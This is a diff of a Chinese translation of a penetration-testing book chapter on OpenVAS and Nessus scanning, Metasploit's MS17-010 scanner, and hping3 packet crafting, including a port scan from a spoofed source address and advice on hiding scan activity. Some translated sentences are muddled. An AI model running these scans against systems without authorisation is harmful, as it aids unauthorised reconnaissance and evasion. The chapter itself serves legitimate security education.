-创建扫描配置时，点击屏幕左上角带星号的小蓝色图标。随后系统会要求您输入名称并选择一个基础模板。可选的基础模板包括空配置（如我在 MyScan 中使用的），以及全套/快速配置，后者包含所有 NVT。因此，您可以从零开始构建，也可以从完整的集合中削减。您会根据自身需求决定是从头开始逐步构建，还是从大块内容中削减。创建后，您即拥有一个可用的配置。创建过程仅需命名并选择基础模板。随后您可能会对其进行调优，以便针对目标网络运行显著的测试。这并不意味着测试会盲目运行，OpenVAS 会在初始扫描后根据发现的内容决定运行哪些测试。当您准备好选择要运行的测试时，需要编辑扫描配置。您首先会确定要启用的家庭，如 `Figure 5.11` 所示的家庭列表的一部分。需要考虑的还有：是否启用家庭、选择哪些 NVT 以及家庭在 NVT 随时间的推移而增加时如何保持更新。您可以选择保持配置静态，或让 OpenVAS 在新增 NVT 时自动启用它们。
+创建扫描配置时，点击屏幕左上角带星号的小蓝色图标。随后系统会要求您输入名称并选择一个基础模板。可选的基础模板包括空配置（如我在 `MyScan` 中使用的），以及全套/快速配置，后者包含所有 NVT。因此，您可以从零开始构建，也可以从完整的集合中削减。您会根据自身需求决定是从头开始逐步构建，还是从大块内容中削减。创建后，您即拥有一个可用的配置。创建过程仅需命名并选择基础模板。随后您可能会对其进行调优，以便针对目标网络运行显著的测试。这并不意味着测试会盲目运行，OpenVAS 会在初始扫描后根据发现的内容决定运行哪些测试。当您准备好选择要运行的测试时，需要编辑扫描配置。您首先会确定要启用的家庭，如 `Figure 5.11` 所示的家庭列表的一部分。需要考虑的还有：是否启用家庭、选择哪些 NVT 以及家庭在 NVT 随时间的推移而增加时如何保持更新。您可以选择保持配置静态，或让 OpenVAS 在新增 NVT 时自动启用它们。
 
 FIGURE 5.11 OpenVAS NVT 家庭
 
@@ -4501,13 +4941,13 @@ FIGURE 5.11 OpenVAS NVT 家庭
 
 #### 扫描任务
 
-扫描配置和目标是创建扫描任务的必要元素。您可以在创建扫描任务时直接创建目标，它会像在目标配置页面中创建的目标一样持久。扫描配置则必须事先完成，除非您使用预包装的扫描配置。进入 “Scans” 菜单并选择 “Tasks”，您会看到类似 `Figure 5.13` 的界面，其中显示正在运行的扫描任务。任务数量越多，图表会随之变化。
+扫描配置和目标是创建扫描任务的必要元素。您可以在创建扫描任务时直接创建目标，它会像在目标配置页面中创建的目标一样持久。扫描配置则必须事先完成，除非您使用预包装的扫描配置。进入 `Scans` 菜单并选择 `Tasks`，您会看到类似 `Figure 5.13` 的界面，其中显示正在运行的扫描任务。任务数量越多，图表会随之变化。
 
 ![FIGURE 5.13 OpenVAS 任务](img/c05f013.png)
 
 **FIGURE 5.13** OpenVAS 任务
 
-开始扫描时，左上角会出现一个类似纸张带星号的图标。鼠标悬停后点击 “New Task”，会弹出 `Figure 5.14` 所示的对话框。您需要从下拉列表中选择目标。如果尚未创建目标，可点击蓝色星号图标创建并保存目标。您还可以根据严重程度或自定义过滤器创建告警，并通过电子邮件、HTTP GET、SMB、SNMP 或其他连接发送告警。此外，还需选择扫描配置，可以是您创建的配置或默认配置。
+开始扫描时，左上角会出现一个类似纸张带星号的图标。鼠标悬停后点击 `New Task`，会弹出 `Figure 5.14` 所示的对话框。您需要从下拉列表中选择目标。如果尚未创建目标，可点击蓝色星号图标创建并保存目标。您还可以根据严重程度或自定义过滤器创建告警，并通过电子邮件、HTTP GET、SMB、SNMP 或其他连接发送告警。此外，还需选择扫描配置，可以是您创建的配置或默认配置。
 
 ![FIGURE 5.14 OpenVAS 任务创建](img/c05f014.png)
 
@@ -4517,18 +4957,15 @@ FIGURE 5.11 OpenVAS NVT 家庭
 
 这并不意味着没有其他值得关注的要素。如果您拥有大型网络和多台扫描器，可能需要选择要使用的扫描器。您还可以定义源接口，以便在扫描器拥有多个网络接口时指定使用哪个接口。您还可以决定扫描目标的顺序，这可能取决于您是否想隐藏活动，或希望通过随机选择主机来使行为不那么明显。您还可以通过限制同时扫描的主机数量以及单个主机上并发测试的最大数量来帮助实现上述目标。
 
-
-
-
--   [启动扫描](https://wiki.example.org/feynmans_learning_method)时，需要查看您的任务列表，并点击类似音频或视频播放器启动按钮的绿色箭头。扫描在您点击启动后才会运行。仅创建扫描即表示您已设置其参数，并不表示已启动扫描。这里的调度功能很有用，因为 OpenVAS 会在您发出指令时自动开始扫描，而无需您手动启动。
+- `[启动扫描](https://wiki.example.org/feynmans_learning_method)`时，需要查看您的任务列表，并点击类似音频或视频播放器启动按钮的绿色箭头。扫描在您点击启动后才会运行。仅创建扫描即表示您已设置其参数，并不表示已启动扫描。这里的调度功能很有用，因为 OpenVAS 会在您发出指令时自动开始扫描，而无需您手动启动。
 
 ### Scan Results
 
-在扫描进行期间，您可以监控扫描结果。此外，您还能够回顾所有已完成的扫描以及历史漏洞。Scans dashboard 会提供图表，帮助可视化漏洞随时间的变化，从而让您判断目标系统的安全态势是否在改善。您可以在 Figure 5.15 查看仪表盘。图表主要聚焦于报告，但这些图表并未展示您所有扫描中漏洞的整体情况。在该图的底部，您可以看到本次安装中已运行的两次扫描的概览。即时扫描是通过 Task Wizard（快速启动方式）完成的。
+在扫描进行期间，您可以监控扫描结果。此外，您还能够回顾所有已完成的扫描以及历史漏洞。`Scans dashboard` 会提供图表，帮助可视化漏洞随时间的变化，从而让您判断目标系统的安全态势是否在改善。您可以在 Figure 5.15 查看仪表盘。图表主要聚焦于报告，但这些图表并未展示您所有扫描中漏洞的整体情况。在该图的底部，您可以看到本次安装中已运行的两次扫描的概览。即时扫描是通过 `Task Wizard`（快速启动方式）完成的。
 
-Scans 菜单提供了多种查看结果的方式。我们首先通过 Results 页面来查看。该页面列出了所有扫描结果。您还能看到更多图表。图表和结果列表在 Figure 5.16 中。虽然图表有趣，但结果列表包含一些重要信息。第一列显示漏洞的简短名称，这应能让您大致了解漏洞的内容。至少，您能从漏洞名称中获取关于相关服务或设备的信息。
+`Scans` 菜单提供了多种查看结果的方式。我们首先通过 `Results` 页面来查看。该页面列出了所有扫描结果。您还能看到更多图表。图表和结果列表在 Figure 5.16 中。虽然图表有趣，但结果列表包含一些重要信息。第一列显示漏洞的简短名称，这应能让您大致了解漏洞的内容。至少，您能从漏洞名称中获取关于相关服务或设备的信息。
 
-此外，您还能获得其他有用信息。在摘要之上，您会看到严重程度。严重程度包括 High、Medium、Low。在严重程度左侧是解决方案类型。示例中显示的全部是厂商补丁。您可能还会看到缓解措施（mitigation），即如果漏洞被利用，存在减轻影响的方法。也可能出现“无可用修复”情况。图 5.16 所示的全部问题是有厂商补丁的，但也存在无补丁的问题以及有缓解措施的问题。
+此外，您还能获得其他有用信息。在摘要之上，您会看到严重程度。严重程度包括 `High`、`Medium`、`Low`。在严重程度左侧是解决方案类型。示例中显示的全部是厂商补丁。您可能还会看到缓解措施（`mitigation`），即如果漏洞被利用，存在减轻影响的方法。也可能出现“无可用修复”情况。图 5.16 所示的全部问题是有厂商补丁的，但也存在无补丁的问题以及有缓解措施的问题。
 
 ![FIGURE 5.15 OpenVAS Scans dashboard](img/c05f015.png)
 
@@ -4538,9 +4975,9 @@ Scans 菜单提供了多种查看结果的方式。我们首先通过 Results �
 
 **FIGURE 5.16** OpenVAS Results list
 
-在严重程度右侧，显示的是 QoD（质量检测度）。QoD 表示 OpenVAS 对漏洞是否为真实正例的置信度。在某些看似 macOS 漏洞中，QoD 列会出现非常高的数值。鉴于这些系统运行的是最新的 macOS 并且在扫描时已全部打补丁，这些高置信度数值具有误导性。要弄清楚 OpenVAS 依据什么判断为真实正例，需要查看关联的 NASL 文件。
+在严重程度右侧，显示的是 `QoD`（质量检测度）。`QoD` 表示 OpenVAS 对漏洞是否为真实正例的置信度。在某些看似 `macOS` 漏洞中，`QoD` 列会出现非常高的数值。鉴于这些系统运行的是最新的 `macOS` 并且在扫描时已全部打补丁，这些高置信度数值具有误导性。要弄清楚 OpenVAS 依据什么判断为真实正例，需要查看关联的 `NASL` 文件。
 
-在最右侧列，您可以访问操作，如 Figure 5.17 所示。由于报告会在 OpenVAS 实例存续期间保留，您可能需要对发现进行必要的修改。正如 macOS 发现的情况，我可以添加一个覆盖（override）。如前所述，并非每个发现都如 OpenVAS 所呈现。有些可能是误报，例如。您可以通过使用覆盖将发现的严重程度设置为“误报”。在 Figure 5.17 中可以看到用于设置覆盖参数的对话框，包括将严重程度设置为误报的选项。
+在最右侧列，您可以访问操作，如 Figure 5.17 所示。由于报告会在 OpenVAS 实例存续期间保留，您可能需要对发现进行必要的修改。正如 `macOS` 发现的情况，我可以添加一个覆盖（`override`）。如前所述，并非每个发现都如 OpenVAS 所呈现。有些可能是误报，例如。您可以通过使用覆盖将发现的严重程度设置为“误报”。在 Figure 5.17 中可以看到用于设置覆盖参数的对话框，包括将严重程度设置为误报的选项。
 
 ![FIGURE 5.17 Setting an override](img/c05f017.png)
 
@@ -4550,18 +4987,15 @@ Scans 菜单提供了多种查看结果的方式。我们首先通过 Results �
 
 您还可以在覆盖中设置其他参数，而不只是严重程度。如果您要修改严重程度，通常还会添加注释，说明更改的原因和目的。这让所有拥有 OpenVAS 访问权限的人员能够审查更改并了解背后的原因。除了修改严重程度等参数外，您还可以为每个发现添加注释。
 
-通过使用注释和覆盖，OpenVAS 可被视为一种漏洞管理工具，而不只是单纯的漏洞扫描仪。您可以用它进行历史追溯、识别已知漏洞，或修改不同参数。存储的这些信息对负责保护系统和网络的任何人都非常有价值，因为他们时刻在与漏洞作斗争。历史信息，尤其是缓解措施以及已采取的 remediation 步骤，对安全专业人员非常有用。
+通过使用注释和覆盖，OpenVAS 可被视为一种漏洞管理工具，而不只是单纯的漏洞扫描仪。您可以用它进行历史追溯、识别已知漏洞，或修改不同参数。存储的这些信息对负责保护系统和网络的任何人都非常有价值，因为他们时刻在与漏洞作斗争。历史信息，尤其是缓解措施以及已采取的 `remediation` 步骤，对安全专业人员非常有用。
 
 ### Nessus
 
-Nessus 是 OpenVAS 的父项目，因此值得一看，尤其是观察其与 OpenVAS 的路径 diverged（背离）之处。虽然 Nessus 是商业产品，但提供了家庭许可证，您可以在家庭网络上使用它，与 OpenVAS 进行比较，并了解另一种漏洞扫描思路。登录后，您会进入扫描列表页面，初始时列表为空。要启动扫描，请点击 New 按钮，这将带您进入可用的扫描策略列表。您可以在 Figure 5.18 中看到部分内置扫描策略。部分策略标有 *Upgrade*，表示这些策略仅在商业版中提供，Home 许可证中不可用。
+`Nessus` 是 `OpenVAS` 的父项目，因此值得一看，尤其是观察其与 `OpenVAS` 的路径 `diverged`（背离）之处。虽然 `Nessus` 是商业产品，但提供了家庭许可证，您可以在家庭网络上使用它，与 `OpenVAS` 进行比较，并了解另一种漏洞扫描思路。登录后，您会进入扫描列表页面，初始时列表为空。要启动扫描，请点击 `New` 按钮，这将带您进入可用的扫描策略列表。您可以在 Figure 5.18 中看到部分内置扫描策略。部分策略标有 `Upgrade`，表示这些策略仅在商业版中提供，`Home` 许可证中不可用。
 
-如果我们以 Basic Network Scan 为起点，即可开始选择目标并进行自定义。Figure 5.19 展示了 Basic Network Scan 的配置设置。第一屏显示您需要提供扫描的名称。请记住，您在此创建的是配置，可多次运行该配置，每次运行都会自动记录时间戳，无需您自行添加日期时间。建议为配置起一个有意义的名称，以便与其他配置区分。
+如果我们以 `Basic Network Scan` 为起点，即可开始选择目标并进行自定义。Figure 5.19 展示了 `Basic Network Scan` 的配置设置。第一屏显示您需要提供扫描的名称。请记住，您在此创建的是配置，可多次运行该配置，每次运行都会自动记录时间戳，无需您自行添加日期时间。建议为配置起一个有意义的名称，以便与其他配置区分。
 
-例如，您可能有一个配置包含特定凭据。Figure 5.20 展示了凭据配置。您可以为主机创建 SSH 和 Windows 凭据用于身份验证。对于每种类型，您可以创建多个配置。您可以使用 SSH 密钥进行某些系统的验证，同时也可以设置用户名和密码的验证方式。根据界面说明，SSH 和 Windows 凭据数量没有上限。要创建另一组凭据，只需点击对应凭据类型行末的按钮即可。
-
-
-
+例如，您可能有一个配置包含特定凭据。Figure 5.20 展示了凭据配置。您可以为主机创建 `SSH` 和 `Windows` 凭据用于身份验证。对于每种类型，您可以创建多个配置。您可以使用 `SSH` 密钥进行某些系统的验证，同时也可以设置用户名和密码的验证方式。根据界面说明，`SSH` 和 `Windows` 凭据数量没有上限。要创建另一组凭据，只需点击对应凭据类型行末的按钮即可。
 
 ![图 5.18 Nessus 中的扫描策略](img/c05f018.png)
 
@@ -4575,59 +5009,59 @@ Nessus 是 OpenVAS 的父项目，因此值得一看，尤其是观察其与 Ope
 
 **图 5.20** 凭据配置设置
 
-除了主机凭据外，你还可以为 `database`、`miscellaneous` 和 `plain text` 设置身份验证凭据。最后一类用于 `HTTP`、`FTP` 和 `SMTP` 等协议。`Miscellaneous` 提供 `VMware` 和 `Palo Alto` 防火墙的设置。这使得 Nessus 能够检查各种应用程序和设备的本地漏洞。
+除了主机凭据外，你还可以为 `database`、`miscellaneous` 和 `plain text` 设置身份验证凭据。最后一类用于 `HTTP`、`FTP` 和 `SMTP` 等协议。`Miscellaneous` 提供 `VMware` 和 `Palo Alto` 防火墙的设置。这使得 `Nessus` 能够检查各种应用程序和设备的本地漏洞。
 
-除了凭据，你还可以配置想要运行的插件。可以通过点击顶部的 **Plugins** 标签页进入插件设置。回顾一下 图 5.19，你会看到左侧垂直排列的一组标签页。这不仅提供了基本设置的访问，还提供了发现、评估、报告和高级配置的访问。发现标签页让你确定将在网络上进行的发现类型，即可以设置端口扫描参数。默认情况下，端口扫描会针对常用端口执行。你可以选择对所有端口进行扫描，这可能会发现额外的漏洞，或至少发现一些你可能未曾预期的端口。
+除了凭据，你还可以配置想要运行的插件。可以通过点击顶部的 `Plugins` 标签页进入插件设置。回顾一下 图 5.19，你会看到左侧垂直排列的一组标签页。这不仅提供了基本设置的访问，还提供了发现、评估、报告和高级配置的访问。发现标签页让你确定将在网络上进行的发现类型，即可以设置端口扫描参数。默认情况下，端口扫描会针对常用端口执行。你可以选择对所有端口进行扫描，这可能会发现额外的漏洞，或至少发现一些你可能未曾预期的端口。
 
-评估标签页让你设置 Nessus 应针对哪些 Web 漏洞进行扫描。默认情况下，Nessus 不会扫描 Web 漏洞。你可以设置不同级别的 Web 漏洞扫描。评估标签页还有一个重要设置。默认情况下，Nessus 会限制检测到的假阳数量。需要注意的是，这里提到的所有设置均位于基础网络扫描策略中。其他扫描策略会有不同的设置，其中一些可以更改。要获取全部设置，你需要通过高级扫描，所有设置都会暴露并可供修改。
+评估标签页让你设置 `Nessus` 应针对哪些 Web 漏洞进行扫描。默认情况下，`Nessus` 不会扫描 Web 漏洞。你可以设置不同级别的 Web 漏洞扫描。评估标签页还有一个重要设置。默认情况下，`Nessus` 会限制检测到的假阳数量。需要注意的是，这里提到的所有设置均位于基础网络扫描策略中。其他扫描策略会有不同的设置，其中一些可以更改。要获取全部设置，你需要通过高级扫描，所有设置都会暴露并可供修改。
 
-报告标签页用于调整报告的详细程度。你可能希望限制报告中提供的细节，仅保留最小信息。默认情况下，Nessus 报告相当完整。每个发现都会包含漏洞细节、严重程度、关联参考以及可能的 remediation。为确保不熟悉 Nessus 的人也能够充分理解，需要提供足够的细节，这会占用大量空间。
+报告标签页用于调整报告的详细程度。你可能希望限制报告中提供的细节，仅保留最小信息。默认情况下，`Nessus` 报告相当完整。每个发现都会包含漏洞细节、严重程度、关联参考以及可能的 `remediation`。为确保不熟悉 `Nessus` 的人也能够充分理解，需要提供足够的细节，这会占用大量空间。
 
-在扫描进行中以及扫描完成后，你可以查看结果。最初，你会在点击“My Scans” 中的扫描名称时看到所有漏洞的列表。如 图 5.21 所示，这里有一个部分列表。除了漏洞列表外，还会显示一个图表，指示哪些类别的漏洞数量最多。在所示扫描中，绝大多数为信息性消息，其次是中等严重程度的漏洞。
+在扫描进行中以及扫描完成后，你可以查看结果。最初，你会在点击 `My Scans` 中的扫描名称时看到所有漏洞的列表。如 图 5.21 所示，这里有一个部分列表。除了漏洞列表外，还会显示一个图表，指示哪些类别的漏洞数量最多。在所示扫描中，绝大多数为信息性消息，其次是中等严重程度的漏洞。
 
 ![图 5.21 扫描结果列表](img/c05f021.png)
 
 **图 5.21** 扫描结果列表
 
-主机列表按 Nessus 识别的问题总数排序，但并非所有发现都是漏洞，因为还有信息性项目。Nessus 在扫描时识别出了 50 台主机，IP 地址以 `.52` 结尾的主机拥有最多已知漏洞。这并不意味着没有其他漏洞，只是 Nessus 当时未能识别。还可能存在假阴，即 Nessus 未能发现已存在的漏洞。右侧列显示的百分比表示 Nessus 认为对该主机的扫描完成度。该快照在扫描中途取得。
+主机列表按 `Nessus` 识别的问题总数排序，但并非所有发现都是漏洞，因为还有信息性项目。`Nessus` 在扫描时识别出了 50 台主机，IP 地址以 `.52` 结尾的主机拥有最多已知漏洞。这并不意味着没有其他漏洞，只是 `Nessus` 当时未能识别。还可能存在假阴，即 `Nessus` 未能发现已存在的漏洞。右侧列显示的百分比表示 `Nessus` 认为对该主机的扫描完成度。该快照在扫描中途取得。
 
-页面顶部有三个标签页。第一个标签页是主机列表，如前所述，按漏洞总数排序。第二个标签页是漏洞数量，按发现的严重程度排序，Critical 问题位于顶部，随后是 High、Medium 等。本地网络扫描发现了两个不同的 Critical 问题。其中一个与 Mozilla Foundation 的软件有关，Nessus 显示目标主机上安装了 Mozilla Foundation 的 Thunderbird 或 Firefox，但版本已不再支持。另一个问题涉及 macOS 系统，操作系统版本比最新版本落后一版。图 5.22 展示了与 Mozilla 漏洞相关的详细信息。
+页面顶部有三个标签页。第一个标签页是主机列表，如前所述，按漏洞总数排序。第二个标签页是漏洞数量，按发现的严重程度排序，`Critical` 问题位于顶部，随后是 `High`、`Medium` 等。本地网络扫描发现了两个不同的 `Critical` 问题。其中一个与 `Mozilla Foundation` 的软件有关，`Nessus` 显示目标主机上安装了 `Mozilla Foundation` 的 `Thunderbird` 或 `Firefox`，但版本已不再支持。另一个问题涉及 `macOS` 系统，操作系统版本比最新版本落后一版。图 5.22 展示了与 `Mozilla` 漏洞相关的详细信息。
 
 ![图 5.22 发现详情](img/c05f022.png)
 
 **图 5.22** 发现详情
 
-在输出中，你会看到发现的描述以及解决方案，即升级到受支持的版本。下方还有指向其他站点的参考链接，提供更多关于该问题的信息。参考站点下方是扫描插件的详细信息，显示已发现的应用版本以及当前可用且受 Mozilla Foundation 支持的版本。可以看到已安装版本落后五个版本，而当时 Mozilla Foundation 提供的当前受支持版本为 61.0。输出中没有显示第二个主机的 IP 地址，仅为简 brevity 显示了一个 IP。
+在输出中，你会看到发现的描述以及解决方案，即升级到受支持的版本。下方还有指向其他站点的参考链接，提供更多关于该问题的信息。参考站点下方是扫描插件的详细信息，显示已发现的应用版本以及当前可用且受 `Mozilla Foundation` 支持的版本。可以看到已安装版本落后五个版本，而当时 `Mozilla Foundation` 提供的当前受支持版本为 `61.0`。输出中没有显示第二个主机的 IP 地址，仅为简 `brevity` 显示了一个 IP。
 
-页面顶部还有一个标记为 **Remediations** 的标签，用于输出如何修复部分已识别的漏洞。如 图 5.23 所示，找到的四条修复措施全部与升级到最新软件版本有关，包括在一种情况下更新正在使用的操作系统版本。
+页面顶部还有一个标记为 `Remediations` 的标签，用于输出如何修复部分已识别的漏洞。如 图 5.23 所示，找到的四条修复措施全部与升级到最新软件版本有关，包括在一种情况下更新正在使用的操作系统版本。
 
 ![图 5.23 修复措施列表](img/c05f023.png)
 
 **图 5.23** 修复措施列表
 
-如前所述，严重程度会有所不同，Nessus 认为的严重程度不一定符合你对环境的了解。你可以在 **Plugin Rules** 标签页（位于左侧导航栏）创建规则，使得针对特定主机的发现自动重新分类。图 5.24 展示了插件规则设置的对话框。你可以指定主机或留空以适用于所有主机，并指定规则适用的插件 ID。设置好所有参数后，选择想要关联的严重程度，Nessus 会自动完成后续操作。
+如前所述，严重程度会有所不同，`Nessus` 认为的严重程度不一定符合你对环境的了解。你可以在 `Plugin Rules` 标签页（位于左侧导航栏）创建规则，使得针对特定主机的发现自动重新分类。图 5.24 展示了插件规则设置的对话框。你可以指定主机或留空以适用于所有主机，并指定规则适用的插件 ID。设置好所有参数后，选择想要关联的严重程度，`Nessus` 会自动完成后续操作。
 
 **图 5.24** 插件规则设置
 
+与 `OpenVAS` 不同，`Nessus` 没有提供向发现结果添加注释的功能。但 `Nessus` 提供了你在 `OpenVAS` 中没有的审计日志。你可以通过插件 ID 和主机进行搜索，并获取运行该插件时的额外详细信息。例如，搜索关键的 `macOS` 过时发现的插件 ID 时，会显示 `Nessus` 无法识别操作系统的主机 IP 地址、`Nessus` 识别到操作系统但不是 `macOS` 的主机 IP 地址，以及操作系统正确但版本号错误的 IP 地址（即该插件运行后未产生任何发现）。
 
+与 `OpenVAS` 类似，`Nessus` 使用 `Network Attack Scripting Language`（`NASL`） 脚本。这些脚本与 `Nessus` 安装一起存储。在 Windows 上，安装目录位于 `Program Files` 文件夹；在 Linux 上，文件存放在 `/opt/nessus`，插件则放在 `/opt/nessus/lib/plugins`。如果想详细了解插件的具体功能以验证发现，应查看脚本。可以通过插件 ID 定位对应的脚本文件。一旦熟悉这些脚本，它们会提供复制漏洞验证测试的详细步骤，这对于排除误报至关重要，且在确认真实漏洞时，需要向所在公司或组织提供相应的文档。
 
-
-与 OpenVAS 不同，Nessus 没有提供向发现结果添加注释的功能。但 Nessus 提供了你在 OpenVAS 中没有的审计日志。你可以通过插件 ID 和主机进行搜索，并获取运行该插件时的额外详细信息。例如，搜索关键的 macOS 过时发现的插件 ID 时，会显示 Nessus 无法识别操作系统的主机 IP 地址、Nessus 识别到操作系统但不是 macOS 的主机 IP 地址，以及操作系统正确但版本号错误的 IP 地址（即该插件运行后未产生任何发现）。
-
-与 OpenVAS 类似，Nessus 使用 Network Attack Scripting Language（NASL） 脚本。这些脚本与 Nessus 安装一起存储。在 Windows 上，安装目录位于 Program Files 文件夹；在 Linux 上，文件存放在 `/opt/nessus`，插件则放在 `/opt/nessus/lib/plugins`。如果想详细了解插件的具体功能以验证发现，应查看脚本。可以通过插件 ID 定位对应的脚本文件。一旦熟悉这些脚本，它们会提供复制漏洞验证测试的详细步骤，这对于排除误报至关重要，且在确认真实漏洞时，需要向所在公司或组织提供相应的文档。
-
-漏洞扫描仅是测试过程中的一个阶段，并非终点。漏洞必须始终进行验证。如果你的任务是尽可能发现更多漏洞，则需要进一步利用这些漏洞进行开发，以期发现更多问题。这可能需要使用 Metasploit 等 exploit 工具，或自定义开发工具，甚至需要构造形态特定的数据包。无论发现的结果如何，都必须在正式呈现前进行验证。
+漏洞扫描仅是测试过程中的一个阶段，并非终点。漏洞必须始终进行验证。如果你的任务是尽可能发现更多漏洞，则需要进一步利用这些漏洞进行开发，以期发现更多问题。这可能需要使用 `Metasploit` 等 `exploit` 工具，或自定义开发工具，甚至需要构造形态特定的数据包。无论发现的结果如何，都必须在正式呈现前进行验证。
 
 ### 使用 Metasploit 查找漏洞
 
-Metasploit 是一个功能多样的工具。当然，你可以使用它来开发应用漏洞，也可以进行之前的端口扫描。由于它是框架且包含大量模块，自然会有大量漏洞扫描模块。例如，有一个针对 Eternal Blue 漏洞的扫描模块。该漏洞是服务器消息块（SMB）协议实现中的缺陷，由国家安全局（NSA）发现并开发了 exploit，随后被名为 Shadow Brokers 的组织在未经 NSA 同意的情况下公开。下面是一个查找易受 Eternal Blue 影响系统的漏洞扫描示例。虽然该漏洞的修复已有多年，但仍有大量生产环境中的系统受其影响。
+`Metasploit` 是一个功能多样的工具。当然，你可以使用它来开发应用漏洞，也可以进行之前的端口扫描。由于它是框架且包含大量模块，自然会有大量漏洞扫描模块。例如，有一个针对 `Eternal Blue` 漏洞的扫描模块。该漏洞是服务器消息块（`SMB`）协议实现中的缺陷，由国家安全局（`NSA`）发现并开发了 `exploit`，随后被名为 `Shadow Brokers` 的组织在未经 `NSA` 同意的情况下公开。下面是一个查找易受 `Eternal Blue` 影响系统的漏洞扫描示例。虽然该漏洞的修复已有多年，但仍有大量生产环境中的系统受其影响。
 
 ```
+
+
+
+```text
 msf6 auxiliary(scanner/portscan/syn)> use auxiliary/scanner/smb/smb_ms17_010
 msf6 auxiliary(scanner/smb/smb_ms17_010)> set RHOSTS 192.168.4.0/24
 RHOSTS => 192.168.4.0/24
 msf6 auxiliary(scanner/smb/smb_ms17_010)> run
- 
 [-] 192.168.4.10:445 - Host does NOT appear vulnerable.
 [-] 192.168.4.15:445 - Host does NOT appear vulnerable.
 [*] 192.168.4.0/24:445 - Scanned 26 of 256 hosts (10% complete)
@@ -4635,7 +5069,7 @@ msf6 auxiliary(scanner/smb/smb_ms17_010)> run
 
 Metasploit 中提供了大量扫描器，并非所有扫描器都直接关联到漏洞。在 Metasploit 中搜索关键字 *scanner* 返回了 619 条结果，其中部分与已知漏洞相关，部分则用于查找可能存在配置问题的应用实例。
 
-```
+```text
    192  auxiliary/scanner/http/manageengine_deviceexpert_user_creds              2014-08-28       normal  No     ManageEngine DeviceExpert User Credentials
    193  auxiliary/scanner/http/manageengine_securitymanager_traversal            2012-10-19       normal  No     ManageEngine SecurityManager Plus 5.5 Directory Traversal
    194  auxiliary/scanner/http/mediawiki_svg_fileaccess                                           normal  No     MediaWiki SVG XML Entity Expansion Remote File Access
@@ -4656,18 +5090,15 @@ Metasploit 中提供了大量扫描器，并非所有扫描器都直接关联到
 
 所有过程表明，应用程序是基于用户交互发起请求的，数据包的报文头信息结构清晰、可追溯至原始数据源。然而，有时你需要发送不遵循常规路径的数据，例如篡改包含非常规数据的报文头。每个报文头字段具有固定长度且为二进制格式，意味着不能在头部字段中传输字符而非数值。网络层以下的报文头绝不会经过 ASCII 解码转换为字符数据。
 
+- [hping](https://wiki.example.org/hping)是开发者认为的 TCP/IP 数据包的“瑞士军刀”。你可以将其用作普通的 ping 程序，发送 ICMP 回显请求。由于`hping`主要是一个数据包构造程序，它允许你使用你想要的头部设置通过不同协议发起连接，默认模式可能对你并不理想。默认情况下，如果你只指定目标主机或 IP 地址而不做其他设置，`hping`会向目标的端口 0 发送带有变化源地址的数据包。地址 0 本质上是无效的目标，因为它被视为保留且没有用途。你不应该收到你正在发送流量的目标系统的任何响应。如果收到响应，说明目标主机真的在违反协议。虽然`hping`使用 TCP 实现这一点，但端口 0 对 UDP 和 TCP 都是无效的。
 
+- 虽然你可以使用`hping`替代 ping 程序，通过使用`-1`参数（即启用 ICMP 模式）来建立对特定端口的连接。你将获得与 ping 程序相同的行为，即获取系统的“存活”状态和往返时间。此外，你还能获得更详细的信息，因为你可以知道特定服务是否正在运行。这在对应用进行测试时可能很有用，帮助你发现服务何时失败。除了往返时间外，响应中会包含大量细节。
 
-
--   [hping](https://wiki.example.org/hping)是开发者认为的 TCP/IP 数据包的“瑞士军刀”。你可以将其用作普通的 ping 程序，发送 ICMP 回显请求。由于`hping`主要是一个数据包构造程序，它允许你使用你想要的头部设置通过不同协议发起连接，默认模式可能对你并不理想。默认情况下，如果你只指定目标主机或 IP 地址而不做其他设置，`hping`会向目标的端口 0 发送带有变化源地址的数据包。地址 0 本质上是无效的目标，因为它被视为保留且没有用途。你不应该收到你正在发送流量的目标系统的任何响应。如果收到响应，说明目标主机真的在违反协议。虽然`hping`使用 TCP 实现这一点，但端口 0 对 UDP 和 TCP 都是无效的。
-
--   虽然你可以使用`hping`替代 ping 程序，通过使用`‑1`参数（即启用 ICMP 模式）来建立对特定端口的连接。你将获得与 ping 程序相同的行为，即获取系统的“存活”状态和往返时间。此外，你还能获得更详细的信息，因为你可以知道特定服务是否正在运行。这在对应用进行测试时可能很有用，帮助你发现服务何时失败。除了往返时间外，响应中会包含大量细节。
-
--   下面的代码片段展示了对目标系统上 Web 服务器进行`hping3`的运行示例。
+- 下面的代码片段展示了对目标系统上 Web 服务器进行`hping3`的运行示例。
 
 **发送 SYN 消息到目标系统**
 
-```
+```text
 kilroy@quiche:~$ sudo hping3 -S -p 80 192.168.86.1
 HPING 192.168.86.1 (eth0 192.168.86.1): S set, 40 headers + 0 data bytes
 len=46 ip=192.168.86.1 ttl=64 DF id=0 sport=80 flags=SA seq=0 win=29200 rtt=7.9 ms
@@ -4683,13 +5114,13 @@ len=46 ip=192.168.86.1 ttl=64 DF id=0 sport=80 flags=SA seq=9 win=29200 rtt=2.4 
 len=46 ip=192.168.86.1 ttl=64 DF id=0 sport=80 flags=SA seq=10 win=29200 rtt=2.2 ms
 ```
 
--   `hping`会返回所有已设置的标志，包括 SYN 和 ACK 以及不分片位（DF）。此外，你还能看到 IP 标识、相对序号以及目标主机提供的窗口大小等信息。对于没有监听的端口，`hping`不会像标准 ping 程序那样提示主机不可达或超时，而是返回与开放端口相同的响应。标志会显示为 RA（表示 RST 和 ACK），说明远程系统重置了端口，表明没有应用程序在该端口上。
+- `hping`会返回所有已设置的标志，包括 SYN 和 ACK 以及不分片位（DF）。此外，你还能看到 IP 标识、相对序号以及目标主机提供的窗口大小等信息。对于没有监听的端口，`hping`不会像标准 ping 程序那样提示主机不可达或超时，而是返回与开放端口相同的响应。标志会显示为 RA（表示 RST 和 ACK），说明远程系统重置了端口，表明没有应用程序在该端口上。
 
--   除了 ICMP 和 TCP，你还可以发送 UDP 消息。由于 UDP 头部选项有限，发送 UDP 消息的参数较少。`hping`可以通过`‑‑scan`（或`‑8`）参数进行端口扫描。下面的示例展示了扫描 1‑1023 端口的过程，针对管理端口范围。输出中被截断的部分是未监听的端口号及其服务名称。
+- 除了 ICMP 和 TCP，你还可以发送 UDP 消息。由于 UDP 头部选项有限，发送 UDP 消息的参数较少。`hping`可以通过`--scan`（或`-8`）参数进行端口扫描。下面的示例展示了扫描 1‑1023 端口的过程，针对管理端口范围。输出中被截断的部分是未监听的端口号及其服务名称。
 
 **使用 hping 进行 UDP 端口扫描**
 
-```
+```text
 root@quiche:~# hping3 --scan 1-1023 –a 10.15.24.5  -2 192.168.86.1
